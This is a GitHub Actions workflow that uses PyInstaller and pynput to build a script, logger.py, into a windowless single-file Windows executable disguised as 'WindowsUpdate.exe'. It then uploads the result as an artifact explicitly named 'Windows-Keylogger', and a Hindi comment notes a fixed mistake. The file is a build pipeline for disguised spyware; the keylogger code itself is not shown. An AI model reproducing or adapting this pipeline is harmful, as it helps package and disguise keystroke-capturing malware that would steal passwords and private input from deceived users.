name: Build Windows Executable

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v3

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller pynput

    - name: Build the executable
      run: pyinstaller --onefile --noconsole --name WindowsUpdate logger.py

    - name: Upload artifact   # <--- गलती यहाँ थी, अब यह ठीक है
      uses: actions/upload-artifact@v3
      with:
        name: Windows-Keylogger
        path: dist/WindowsUpdate.exe
